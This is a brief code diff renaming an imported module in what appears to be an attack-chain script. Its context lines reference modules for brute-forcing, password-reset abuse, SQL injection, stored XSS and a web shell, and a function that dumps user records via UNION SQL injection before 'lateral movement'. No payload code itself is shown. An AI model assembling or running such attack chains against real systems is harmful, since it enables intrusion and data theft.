@@ -4,7 +4,7 @@ import requests
 
 import enum_and_brute
 import Broken_Password_Reset
-import SQLi_UNION
+import SQLi_Union
 import web_shell
 import stored_xss
 import SQLi
@@ -85,7 +85,7 @@ def chain_2_breach():
         
     print("[*] Phase 1: Dumping database via UNION SQLi...")    
     # Phase 1: Database Exfiltration
-    users = SQLi_UNION.dump_users(session_id=sid)
+    users = SQLi_Union.dump_users(session_id=sid)
     
     if users:
         # Phase 2: Post-Exploitation / Lateral Movement
